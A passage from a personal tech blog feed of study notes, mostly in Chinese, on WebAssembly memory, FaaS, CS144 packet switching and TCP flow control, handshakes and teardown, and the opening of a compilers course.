class="hljs-keyword">i32.const</span> <span class="hljs-number">1</span><span class="hljs-punctuation">))))</span><br><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p><strong>内存操作</strong></p><p>Memory:</p><p>The above example is a pretty terrible logging function: it onlyprints a single integer! What if we wanted to log a text string? To dealwith strings and other more complex data types, WebAssembly provides<strong>memory</strong> (although we also have <ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#reference_types">Referencetypes</a> in newer implementation of WebAssembly). According toWebAssembly, <strong>memory is just a large array of bytes</strong> thatcan grow over time. WebAssembly contains instructions like<code>i32.load</code> and <code>i32.store</code> for reading and writingfrom <ahref="https://webassembly.github.io/spec/core/exec/index.html#linear-memory">linearmemory</a>.</p><p>对应到js里，其实就是ArrayBuffer</p><p>So a string is just a sequence of bytes somewhere inside this linearmemory. Let's assume that we've written a suitable string of bytes tomemory; how do we pass that string out to JavaScript?</p><p>Wassm提供了memory接口，可以暴露wassm的memory给js消费，js可以用ArrayBuffer相关api进行消费</p><p>当然也可以创建memory给wassm使用</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">js:</span><br>WebAssembly.Memory<br><br><span class="hljs-symbol">wassm:</span><br>(import <span class="hljs-string">&quot;js&quot;</span> <span class="hljs-string">&quot;mem&quot;</span> (memory <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><blockquote><p><strong>Note:</strong> Above, note the double semicolon syntax(<code>;;</code>) for allowing comments in WebAssembly files.</p></blockquote><p><strong>类型</strong></p><p>WebAssembly currently has four available <em>number types</em>:</p><ul><li><code>i32</code>: 32-bit integer</li><li><code>i64</code>: 64-bit integer</li><li><code>f32</code>: 32-bit float</li><li><code>f64</code>: 64-bit float</li></ul><h3 id="vector-types"><ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#vector_types">Vectortypes</a></h3><ul><li><code>v128</code>: 128 bit vector of packed integer, floating-pointdata, or a single 128 bit type.</li></ul><h3 id="reference-types"><ahref="https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format#reference_types">Referencetypes</a></h3><p>bulk mem operations</p><p>seven new built-in operations are provided for bulk memory operationssuch as copying and initializing, to allow WebAssembly to model nativefunctions such as <code>memcpy</code> and <code>memmove</code> in a moreefficient, performant way.</p><ul><li><code>data.drop</code>: Discard the data in an data segment.</li><li><code>elem.drop</code>: Discard the data in an element segment.</li><li><code>memory.copy</code>: Copy from one region of linear memory toanother.</li><li><code>memory.fill</code>: Fill a region of linear memory with agiven byte value.</li><li><code>memory.init</code>: Copy a region from a data segment.</li><li><code>table.copy</code>: Copy from one region of a table toanother.</li><li><code>table.init</code>: Copy a region from an element segment.</li></ul><p><strong>多线程</strong></p><p>https://github.com/AllenWrong/Self-learning-Record/blob/master/CS143%20Compiler.md</p><p>Sidecar:</p><p>https://learn.microsoft.com/en-us/azure/architecture/patterns/sidecar</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>faas与severless</title>
    <link href="/emocoder/2023/06/22/faas%E4%B8%8Eseverless/"/>
    <url>/emocoder/2023/06/22/faas%E4%B8%8Eseverless/</url>
    
    <content type="html"><![CDATA[<p>faas</p><p>是什么</p><p>为什么？</p><p>有什么用？</p><p>数据编排——充当BFF =&gt; 演化成了SFF(Serverless For Frontend）</p><p>优点：我们的函数启动后，调用后端提供的元数据接口，并将返回的元数据加工成前端需要的数据格式；我们的FaaS 函数完全就可以休息了。</p><p>利用快速冷启动的特性</p><p>缺点：</p><p>SSR：——充当SSR</p><p>severless vs faas ?</p><p>fass 与轻服务</p><p>https://tech.bytedance.net/articles/7179520424416378938?from=lark_all_search#SuIKdSm6CoUCaExw7WKcrZXin3f</p><p>https://bytedance.feishu.cn/wiki/wikcn8nGAVxRMC1vBYF1tzeAAbg#</p><p>https://blog.csdn.net/li1669852599/article/details/108795172</p><p>https://blog.csdn.net/li1669852599/article/details/108838179</p><p>https://zhuanlan.zhihu.com/p/260440613</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>faas</title>
    <link href="/emocoder/2023/06/22/faas/"/>
    <url>/emocoder/2023/06/22/faas/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 3 Packet Switching</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分组交换">分组交换</h2><p>特点：</p><ul><li>Packets被独立地路由，通过查找当前路由的局部路由表</li><li>所有的Packets共享一个完整的Link</li><li>路由不需要维护通信状态</li><li>路由是有缓存的<ul><li>缓存在以下情况下会存在Packets：<ul><li>When two or more packets arrive at the same time</li><li>During periods of congestion</li></ul></li></ul></li></ul><h2 id="curcuit-switching">Curcuit switching</h2><p>建议了解下通信历史</p><p>建议了解下网络历史</p><p>特点：</p><ul><li>Each call has its own private, guaranteed, isolated data rate fromend-to-end</li><li>A call has three phases:<ul><li>Establish circuit form end-to-end</li><li>Communicate</li><li>Close circuit</li></ul></li><li>Originally, a circuit was end-to0end physical wire</li><li>Nowdays, a circuit is like a virtual private wire</li></ul><p>能否在计算机通信使用Curcuit switching</p><ul><li>Inefficient:计算机通信是爆炸式的，通信需要比较高的速度，不然影响体验</li><li>Diverse Rates: 计算机通信在不同情况下速度是不同的，比如 a web serverstreaming video at 6Mb/s, typing at a. Character per second. A fixedrate circuit will not be much use.</li><li>State management. Curcuit switch maintain per-communication state,which must be managed.</li></ul><blockquote><p>Efficient use of expensive links</p><ul><li>Links were assumed to be expensive and scarce</li><li>Packet switching allows many, bursty flows to shae the same linkefficiently</li><li>Circuit switching is rarely used for data networks, ... because ofvery inefficient use of the links</li></ul><p>(PS:其实就是说分组交换允许共享链接，而电报交换每次链接都是一个新的链路，重新构建一个Link代价是比较大的)</p><p>Resilience to failure of links &amp; routerss</p><ul><li>For high reliability, [the internet] was to be a datagram subnet, soif some lines and [routers] were destroyed, messages could be ...rerouted</li></ul><p>(PS: 分组交换即使中间路由损坏了，也可以通过其他路由重新路由)</p></blockquote><p>排队机制是ATM交换中一个极为重要的内容，队列的溢出会引起信元丢失，信元排队是交换时延和时延抖动的主要原因，因此排队机制对ATM交换机性能有着决定性的影响。基本排队机制有三种：输入排队、输出排队和中央排队。这三种方式各有缺点，如输入排队有信头阻塞，交换机的负荷达不到60%；输出排队存储器利用率低，平均队长要求长，而中央排队存储器速率要求高、存储器管理复杂。同时，三种方式有各有优点，输入队列对存储器速率要求低，中央排队效率高，输出队列则处于两者之间，所以在实际应用中并没有直接利用这三种方式，而是加以综合，采取了一些改进的措施。</p><h2 id="分包交换">分包交换</h2><h3 id="what-does-a-packet-switch-look-like">what does a packet switchlook like ?</h3><h3 id="what-does-a-packet-switch-do">what does a packet switch do?</h3><ul><li>以太网交换机(Ethernet switch)</li><li>因特网路由器(Internet router)</li></ul><h3 id="how-address-lookup-works">How address lookup works</h3><ul><li>以太网交换机(Ethernet switch)</li><li>因特网路由器(Internet router)</li></ul><p>以太网交换机：</p><figure><img src="https://img1.sdnlab.com/%20/wp-content/uploads/2020/11111.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617171950912.png"alt="image-20230617171950912" /><figcaption aria-hidden="true">image-20230617171950912</figcaption></figure><p><strong>Ethernet switch</strong></p><ul><li>Examine the header of each arrving frame</li><li>If the Ethernet DA(Destniation addrdress) is in the forwardingtable, forward the frame to correct output port(s)</li><li>If the Ethernet DA is not in the table, boradcast the frame to allposts</li><li>Entries in the table are learned by examining the Ethernet ofarriving packets.</li></ul><p>Internet Router</p><ul><li><p>If the Ethernet DA of the arriving frame belongs to the router,accept the frame. Else drop it</p></li><li><p>Examine the IP version number and length of the datagram</p></li><li><p>Decrement the TTL, update the IP header checksum.</p></li><li><p>Check to see if TTL == 0</p></li><li><p>if the IP DA is in the forwarding table, forward to the correctegress port(s) for the next hop</p></li><li><p>Find the Ethernet DA for the next hop router</p></li><li><p>Create a new Ethernet frame an d send it</p></li><li><p>Lookup address: How is the address looked up into forwardingtable ?</p></li><li><p>Switching: How is the packet sent to the correct output port?</p></li></ul><p><strong>Lookup address: Ethernet</strong></p><ul><li><p>Methods:</p><ul><li>Store address in hash table (maybe 2-way hash)</li><li>Look for exact match in hash table</li></ul></li></ul><p><strong>Lookup address: IP</strong></p><p>Lookup is a longest prefix match, not an exact match</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172810926.png"alt="image-20230617172810926" /><figcaption aria-hidden="true">image-20230617172810926</figcaption></figure><p>Method 1:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172841236.png"alt="image-20230617172841236" /><figcaption aria-hidden="true">image-20230617172841236</figcaption></figure><p>Method 2:</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172919259.png"alt="image-20230617172919259" /><figcaption aria-hidden="true">image-20230617172919259</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617172935778.png"alt="image-20230617172935778" /><figcaption aria-hidden="true">image-20230617172935778</figcaption></figure><p>switching packeted to the egress port(向导出端口转发):</p><ul><li>Output queuing and sharedmemory（输出队列和共享内存，输出存在缓存，如下图的Buffer memory）</li><li>Input queuing and head-of-line blocking(输入队列，输出存在缓存)</li><li>Virtual output queues（虚拟输出队列）</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175054605.png"alt="image-20230617175054605" /><figcaption aria-hidden="true">image-20230617175054605</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175119541.png"alt="image-20230617175119541" /><figcaption aria-hidden="true">image-20230617175119541</figcaption></figure><p>但是存在线头阻塞（Head of lineblocking），由于其影响，速率下降了，因为同一时刻，inputqueue内最前面的挡住了后面排队的：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175353059.png"alt="image-20230617175353059" /><figcaption aria-hidden="true">image-20230617175353059</figcaption></figure><p>解决方法：Virtual Output Queue</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617175420698.png"alt="image-20230617175420698" /><figcaption aria-hidden="true">image-20230617175420698</figcaption></figure><p>The simplest and slowest switches uses output queuing, whichminimizes packet delay.</p><p>High performance switches often use iput queuing, with virtual outputqueues to maximize throughput.</p><p>lab 0:</p><p>使用操作系统的TCP和流式socket抽象，基于Internet写一个fetch webpage的程序：</p><ul><li>使用IDE打开../apps/webget.cc</li><li>在ge tURl函数里实现你的代码</li><li>就像该文件里描述的那样，实现一个简单的web客户端（使用http协议）（注：使用<code>TCPSocket</code>and <code>address</code> 这两个类）</li></ul><p>提示：</p><ul><li>Please note that in HTTP, each line must be ended with “” (it’s notsufficient to use just “” or endl).</li><li>Don’t forget to include the “Connection: close” line in yourclient’s request. This tells the server that it shouldn’t wait aroundfor your client to send any more requests after this one. Instead, theserver will send one reply and then will immediately end its outgoingbytestream (the one from the server’s socket to your socket). You’lldiscover that your incoming byte stream has ended because your socketwill reach “EOF” (end of file) when you have read the entire byte streamcoming from the server. That’s how your client will know that the serverhas finished its reply.</li><li>Make sure to read and print all the output from the server until thesocket reaches “EOF” (end of file)—<strong>a single call to read is notenough.</strong>确保读取和打印所有来自服务器的输出，知道socket达到了EOF（文件末尾）</li><li>希望你只用9行代码</li></ul><p>正如上面的<code>TCPSocket</code>类在网络通信中是非常重要的，eventhough the Internet itself only provides the service of “best-effort”(unreliable) datagrams.</p><p>下面将实现一个字节流，已经提供了相关的抽象。</p><p>字节s从input侧写入，并以相同顺序从output侧读取，字节流是有限的writer可以endthe input, 表示没有更多字节写入了。reader一直读，直到遇到了EOF。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Network-CS144 の 2 TCP Model</title>
    <link href="/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/"/>
    <url>/emocoder/2023/06/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="tcp模型">TCP模型</h2><table><thead><tr class="header"><th>性质</th><th>行为</th></tr></thead><tbody><tr class="odd"><td>字节流</td><td>可靠的字节传输服务</td></tr><tr class="even"><td>可靠传输</td><td>确认机制保证了正确有序的传输；checksum检测错误数据，序列号检测丢失数据，滑动窗口式流量控制让值接收方过载；超时和重传机制</td></tr><tr class="odd"><td>有序</td><td>有序同步传输（序列号和确认号机制）</td></tr><tr class="even"><td>用塞控制</td><td></td></tr></tbody></table><p>TCP连接的唯一ID</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[TCP Data src<span class="hljs-built_in"> port </span>, dest port][Ipv4 header,<span class="hljs-built_in"> IP </span>src addr,<span class="hljs-built_in"> IP </span>dest addr, protocol ID = <span class="hljs-string">&#x27;TCP&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般由src port , dest port][Ipv4 header, IP src addr, IP dest addr,protocol ID = 'TCP'组成唯一ID</p><p>Host A increments src port for every new connection</p><p>TCP picks ISN(initial seq number) to avoid overlap with previousconnections with same ID(防止和上一个TCP连接的数据混淆)</p><h2 id="section"></h2><p>TCP如何可靠？</p><p>停止与等待/滑动窗口</p><h2 id="端到端原则">端到端原则</h2><p>为什么Network不做更多的事情：</p><ul><li>压缩数据</li><li>reformat/imporove requests</li><li>Serve cached data</li><li>add security</li><li>Migrate connections across the network</li><li>or one of any of a huge number of other things</li></ul><p>Network仅仅负责传输的事情，不负责其他的，如存储，如果像上面所说，把很多东西都交给了network来做，实际上很多做不到，或者说有缺陷，所以实际实现中，网络的设计应该满足端到端原则，只负责两边的传输相关功能</p><h2 id="finite-state-machine">Finite State Machine</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">state1 =&gt;([event causing <span class="hljs-keyword">state</span> transition | actions taken <span class="hljs-keyword">on</span> <span class="hljs-keyword">state</span> transition]) state2<br><br>state1 =&gt;[event | action] state3<br></code></pre></td></tr></table></figure><h2 id="flow-control流量控制">flow control（流量控制）</h2><p>流量控制要解决的问题：要解决的问题是发送方和接收方速度差异不一致问题，两种方案：</p><ul><li>Stop and wait</li><li>slide window</li></ul><p>举个例子：</p><p>sender的发送速率: 500, 000 packets/second</p><p>receive的接收速率r: 200, 000 packets/second</p><p>如果全速发送，将会丢包40%</p><p>流量控制：不要发送超过接收方可以处理的数据包</p><p>idea：接收方可以发送反馈，这里有两种方式</p><ul><li>停止等待 (其实是window size = 1的滑动窗口)</li><li>滑动窗口</li></ul><p>停止等待：</p><ul><li>任意时间链路中最多仅有一个packet</li><li>发送者每次发送一个</li><li>接收方收到后返回响应</li><li>当接收方收到响应，再次发送新的packet</li><li>一旦超时，重新发送当前数据</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121206723.png"alt="image-20230611121206723" /><figcaption aria-hidden="true">image-20230611121206723</figcaption></figure><p>简单停止等待的🌰：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121246484.png"alt="image-20230611121246484" /><figcaption aria-hidden="true">image-20230611121246484</figcaption></figure><p>case 1: 没有信息丢失</p><p>case 2: req 丢失，timeout 重新发送</p><p>case 3: response 丢失， timeout 重新发送</p><p>case 4: 前面一个丢失的数据报仅仅是delay了，这样就会有重复</p><p><strong>solution:</strong> Use 1-bit counter in data andacknowledgements</p><p>​ Receiver can tell if new data or duplicated</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230611121527344.png"alt="image-20230611121527344" /><figcaption aria-hidden="true">image-20230611121527344</figcaption></figure><p>这样间隔的数据报counter位是不一样的</p><p>1bit基于两个假设：</p><ul><li>延迟不会超过多个timeout，这样间隔的数据counter位是一样的</li><li>网络本身并复制packet，因为如果发送重复packet，那么前后两个packet本身是一致的，但是由于计数却是不一致的，这样两个packet就会同时存在</li></ul><h2 id="滑动窗口">滑动窗口</h2><p>考虑一个发送数据包的🌰：</p><p>上海 =&gt; 北京</p><p>网络性能上限是 10Mb/s</p><p>RTT = 50ms</p><p>Ethnet的传输速度是12kb/s</p><p>这样1s可以发送20次，总共可以发20 * 12 = 240kb/s</p><p>240kb/s/10Mb/s = 240/10, 000 = 2.4%</p><p>假如使用滑动窗口（这里考虑发送方和接收方窗口大小一致）：我们可以使用一个可以达到新能瓶颈的windowsize</p><p>240 * 42 = 1080，大约48个window size即可充分使用整个网络带宽</p><p>滑动窗口：</p><ul><li>Gerneration of stop-and-wait: allow multiple un-packed segments</li><li>Bound on number of un-packed segments, called window</li><li>Can keep pipe full (充分使用整个网络带宽)</li></ul><p>Sliding window Sender</p><ul><li>窗口内的每个segment都有一个序列号</li><li>发送方维护三个变量<ul><li>send window size(sws)</li><li>Last acknowledgment received (LAR)</li><li>Last segment sent(LSS)</li></ul></li><li>Maintain invariant: (LSS - LAR) &lt;= SWS</li><li>缓存窗口内的segments</li><li>当有新的确认到来，扩张窗口</li></ul><p>Sliding window Receiver</p><ul><li>维护三个变量<ul><li>Receive window size(sws)</li><li>Last acceptable segment (LAS)</li><li>Last segment received(LSR)</li></ul></li><li>Maintain invariant: (LAS - LSR) &lt;= RWS</li><li>如果接受的Packet小于LAS，回复确认</li><li>累计确认：如果收到了1,2,3,5，则回复ack = 3</li></ul><p>比如：RWS=5, LSR = 3, 那么本次将会接收4 ,5 ,6, 7, 8,如果有10，是不会接收的</p><p>RWS, SWS and Seq Space</p><ul><li>RWS &gt;= 1, SWS &gt;= 1, RWS &lt;= SWS</li><li>if RWS = 1, go back N protocol, need SWS + 1 seq numbers</li><li>if RWS = SWS, need 2SWS seq numbers</li><li>Generally need RWS + SWS seq numbers</li></ul><p>TCP流量控制：</p><ul><li>接收方 advertises RWS using window field</li><li>Sender can only send data up to LAR + window</li></ul><p>累计确认：累积确认这个概念应该不只适用于TCP协议，也适用其他层，比如链路层。</p><p>一般地讲，如果发送方发了包1，包2，包3，包4；接受方成功收到包1，包2，包3。那么接受方可以发回一个确认包，序号为4(4表示期望下一个收到的包的序号；当然你约定好用3表示也可以)，那么发送方就知道包1到包3都发送接收成功，必要时重发包4。一个确认包确认了累积到某一序号的所有包，而不是对每个序号都发确认包。</p><p>具体到TCP，它对字节编号。比如发送方发了包1，包2，包3；包1含字节0到10，包2含字节11到20，包3含字节21到30。接受方成功收到包1，包2。那么接受方发回一个包含确认序号21的包，发送方就知道字节0到20(包1，包2)都成功收到，必要时要重发的只需从字节21开始。</p><h2 id="重传策略">重传策略</h2><p>现在已经有了window size的概念，累计确认的概念，每个Packet都有自己的定时器</p><p>如果定时器超时怎么办？</p><ul><li>Go-back-N:一旦一个包丢失了将会重发整个窗口数据，本质上是因为接收方的窗口大小仅仅为1</li><li>选择重传：一旦一个包丢失了只会重发整个窗口数据丢失的那个包</li></ul><p>https://blog.csdn.net/qq_44807642/article/details/103054914https://zhuanlan.zhihu.com/p/589068775https://blog.csdn.net/u011617742/article/details/50387670#:~:text=%E5%9C%A8%E8%BF%94%E5%9B%9EN%E5%8D%8F%E8%AE%AE%E4%B8%AD%EF%BC%8C%E5%8F%91%E9%80%81%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%BF%85%E9%A1%BB%3C%3D2m-1%2C%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E5%A7%8B%E7%BB%88%E4%B8%BA1%E3%80%82,%E6%9C%AC%E8%B4%A8%E5%B0%B1%E6%98%AF%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%83%BD%20%E8%B6%85%E8%BF%87%E5%BA%8F%E5%8F%B7%E8%83%BD%E8%A1%A8%E7%A4%BA%E7%9A%84%E8%8C%83%E5%9B%B4%EF%BC%8C%E4%BE%8B%E5%A6%82%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E6%98%AF3%EF%BC%8C%E7%AA%97%E5%8F%A3%E6%98%AF6%E7%AA%97%E5%8F%A3%E6%AF%94%E6%9C%80%E5%A4%A7%E5%BA%8F%E5%8F%B7%E5%A4%A7%EF%BC%8C%E4%BC%9A%E5%87%BA%E7%8E%B00%EF%BC%8C1%EF%BC%8C2%2C3%2C0%2C1%E8%BF%99%E6%A0%B7%E7%9A%84%E7%AA%97%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%97%A0%E6%B3%95%E5%88%A4%E6%96%AD%E6%8E%A5%E6%94%B6%E7%AA%97%E5%8F%A3%E8%BF%94%E5%9B%9E%E7%9A%84ACK0%E6%98%AF%E4%BB%A3%E8%A1%A8%E7%AC%AC%E4%B8%80%E4%B8%AA0%E6%94%B6%E5%88%B0%E8%BF%98%E6%98%AF%E7%AC%AC%E4%BA%8C%E4%B8%AA0%E6%94%B6%E5%88%B0%E3%80%82</p><h2 id="tcp-header">TCP header</h2><h2 id="tcp的setup-teardown">TCP的Setup &amp; Teardown</h2><p>可靠的通信依赖于通信双方的状态</p><p>问题是链接建立的时候如何维护这个状态？</p><p>当断连的时候如何清理这些状态？</p><p>Cleaning Up Safely</p><ul><li>Problems with closed socket<ul><li>What if final ack is lost in the network</li><li>What if the same port pair is immediately resued for a newconnection ?</li></ul></li><li>Solution: 'active' closer goes into TIME WAIT<ul><li>Active close is sendingFIN before receving one</li><li>Keep socket around for 2 MSL (twice the 'maximum segmentlifetime')</li></ul></li><li>Can pose problems with servers<ul><li>OS has too many socketd in TIME WAIT, slows things down</li><li>Hack: Can send RST and delete socket, so SO_LINGER socket option totime 0</li><li>OS won't let you re-start server because port still in use(SO_REUSEADDR) option lets you re-bind used port number.</li></ul></li></ul><p><strong>TCP🌰：</strong></p><p>不管是发送方还是接收方都会维护一个序列号（用于同步自己发送的数据）和确认号（用于同步对方的序列号），即使是像建立连接的时候数据段长度为0，但是对应的序列号和确认号也要消耗掉一个序号（即自增）</p><figure><imgsrc="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a437fcc7a69a4ef9b57b34d38a02c2bf~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><p>来看一个🌰：以下都是相对序列号</p><figure><imgsrc="https://img-blog.csdn.net/20160818012008762?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>客户端 =&gt; 服务端: [SYN], seq = 0, len = 0, syn = 1, len = 0(客户端传递seq希望和服务端同步自己的数据,同时消耗掉客户端一个序列号，下一次客户端序列号就是从1开始)</p><p>客户端 &lt;= 服务端: [SYN, ACK] , seq = 0, ack = 1, syn = 1, len = 0(服务端回应同步，传递seq希望和客户端同步自己的数据,同时消耗掉服务端一个序列号, 下一次服务端序列号就是从1开始)</p><p>客户端 =&gt; 服务端: [ACK], ack = 1, seq = 1, len =0(客户端回应同步)</p><p>开始发送数据</p><p>客户端 =&gt; 服务端：[ACK], seq = 1, len = 474, ack =1(ack用于同步对方的消息)</p><p>客户端 &lt;= 服务端：[ACK], seq = 1, ack = 475(ack用于同步对方的消息,表示我已经收到你的前474个数据包)，服务端无响应数据，仅仅是ack数据包</p><p>客户端 &lt;= 服务端：[ACK], seq = 1, ack = 475, len = 1448, next seq= 1449, 是对上一次的客户端请求的一次tcp响应包</p><p>客户端 &lt;= 服务端：[ACK], seq = 1449, ack = 475, len = 1448, nextseq = 2897, 依旧是对上一次的客户端请求的一次tcp响应包</p><p>客户端 &lt;= 服务端：[ACK], seq = 2897, ack = 475, len = 1334, nextseq = 2897 + 1334, 还是对上一次的客户端请求的一次tcp响应包</p><p>上面的序列号是相对的，所以看起来都是从0开始，但是实际上起始序列号是随机的，为什么要初始化起始序列号？</p><ul><li>避免偶然性，防止意外乱入，但也不是绝对安全的<ahref="https://zhuanlan.zhihu.com/p/553763233#:~:text=这样的场景还是很有可能发生的。,假如服务器断电重启之前，客户端发出的报文A由于网络阻塞还没达到；断电重启之后，收到客户端超时重传的TCP报文AA，因为服务端已经断电重启了，先前的TCP连接已经不存在了，所以此时服务端会返回reset（RST">TCP连接时，随机产生初始化序列号的原因- 知乎 (zhihu.com)</a></li><li>安全性，防止恶意插入，因为如果起始序列号是固定的活着容易猜到的，在网络代理中，抓到tcp包，即可插入自己的数据，但是实际上几乎所有代理工具都无法解析到tcp的起始序列号。</li></ul><p>https://www.cnblogs.com/163yun/p/9552368.html</p><p>终断连接的方式：</p><p>不干净中端：由于特殊原因（像断电）直接中断，<strong>TCPConnection发送或接收到一个首部字段中的RST标志位被设置的segment</strong>。这种情况下，inbound和outbound的ByteStream都处于errorstate，并且<code>active()</code>方法可以马上返回false 。</p><p>干净中断：在没有error的情况下关闭（<code>active()</code>=false）。<strong>这种情况可以尽可能地保证两个字节流都完全可靠地交付到接收对等方</strong>。<strong>由于两将军问题，不可能保证对等方都能完全干净关闭连接</strong>，但是可以非常接近。</p><p>如何尽量做到干净中断：</p><ol type="1"><li>对于发送方来说，应用层读取结束(如EOF)且数据缓冲区(byte_stream)为空，此时可以发送FIN报文</li><li>对于接收方来说，只能被动结束，在收到了FIN，且重组缓冲区为空（这个时候说明数据没问题，所以收到FIN并不代表输入结束，有可能发生乱序，这个时候不应该对FIN确认）；对于应用层来说，如果byte_stream，<strong>表明整个读取输入流的结束</strong></li></ol><p>所以结合上面2点来看，在满足下面几个条件之后说明双方干净关闭：</p><ol type="1"><li><p>对于接收方，输入流被完全确认，且数据没问题(Reassembler缓冲区为空)，</p></li><li><p>对于发送方。应用层读取结束，Bytesteam为空</p></li><li><p>发送方已经收到远方的ACK</p></li><li><p>条件3比较苛刻，因为一般发送FIN报文对时候_outstanding_segments不一定为空，为了满足这个条件有两种方案：</p><ol type="1"><li><p>两个流都已经结束后 linger一段时间，由于StreamReassembler为空不好直接判断，无法发送ack（ack只能确保收到了），我们可以让本地的TCPConnection等待一段时间，如果对等端没有重传任何东西，那么就可以相信对等端收到了ack。</p></li><li><p>被动关闭</p><p>如果在TCPConnection发送FIN之前，TCPConnection的输入流就结束了（收到了FIN），那么这个TCPConnection在两个流结束后不需要linger。（因为FIN在发送ack之后，所以FIN的seqno大于之前发送的ack，所以对方对FIN的确认，就相当于确认了之前发送的所有ack）</p></li></ol></li></ol><p>A =&gt; B</p><p>B是接收方，对于B来说每个segment都会发送ack，但是最后一次的ack他并不知道A是否收到了，B不知道什么时候关闭，所以A和B在收到对方的FIN之后，共同等待一段时间。</p><p>当然有一种情况比较特殊，也就是说A发送了FIN之前，B关闭了它的ByteStream。具体地说，在TCPSender发送带FIN的segment之前，如果TCPConnection的入向stream已经早早地结束了，那么TCPConnection就不需要做等待一段时间再关闭连接的操作了。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络，计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 1 Introduction</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><h3 id="compiler-vs-interpreter">Compiler vs Interpreter</h3><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230625222308600.png" alt="image-20230625222308600" style="zoom:50%;" /></p><h3 id="history-of-compiler">History of Compiler</h3><blockquote><p>很喜欢的一句话：</p><p>When hardware cost the most in absolute and relative terms more thanthey would ever cost again already, the software was the dominantexpense. And in making good use out of computers.</p><p>当硬件占据了绝对成本，就该考虑软件了。</p></blockquote><blockquote><p>FORTRAN：</p><p>The first compiler: Huge impact on computer science</p><p>Led to an enormous body of theoretical work</p><p>Modern compilers preserve the outline of FORTRAN</p></blockquote><p>现代编译器一般由以下组成：</p><ul><li>Lexical Analysis</li><li>Parsing</li><li>Semantic Analysis</li><li>Optimization</li><li>Code Genderation</li></ul><p>First Step: recognize words — Smallest unit above letters</p><p>This is a sentence</p><p>Lexical analysis divides program text into "words" or "tokens".</p><p>If x==y then z = 1; else z = 2;</p><p>编译器如何知道第一个双等于不是两个分开的独立的等于号？</p><p>Once words are understood, the next step is to understand sentencestructure</p><p>Parsing = Digramming Sentences — The diagram is a tree</p><p>看一个自然语言的例子</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230625224323367.png"alt="image-20230625224323367" /><figcaption 